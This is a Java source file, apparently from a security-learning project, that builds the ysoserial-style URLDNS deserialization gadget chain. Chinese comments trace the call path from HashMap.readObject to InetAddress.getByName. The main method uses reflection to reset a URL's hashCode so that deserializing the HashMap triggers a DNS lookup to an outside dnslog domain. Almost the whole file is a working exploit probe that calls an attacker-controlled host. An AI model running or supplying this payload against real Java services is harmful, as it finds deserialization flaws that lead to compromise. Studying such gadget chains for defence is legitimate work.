package com.pacemrc.javasec.deserialize.ysoserial;

import java.net.URL;
import java.util.HashMap;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import com.pacemrc.javasec.utils.*;

/**
 * URLDNS调用链
 * HashMap.readObject()->putVal()->hash()->
 * URL.hashCode()->
 * URLStreamHandler.hashCode()->getHostAddress()->
 * URL.getHostAddress()->
 * InetAddress.getByName()
 */

/**
 * reference
 * https://www.bilibili.com/video/BV1y94y1f7uE?spm_id_from=333.337.search-card.all.click
 */
public class URLDNS {

    public static void main(String[] args) throws Exception {

        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();
        URL url = new URL("http://b7otbwcu.dnslog.pw");

        Reflections.setFieldValue(url,"hashCode",-2);
        Reflections.setFieldValue(url,"hashCode",-1);//设置hashcode等于-1，目的是让反序列化过程中执行解析URL动作
        hashMap.put(url,8888);

        Deserialize.doSerialAndDeserial(hashMap);
    }
}

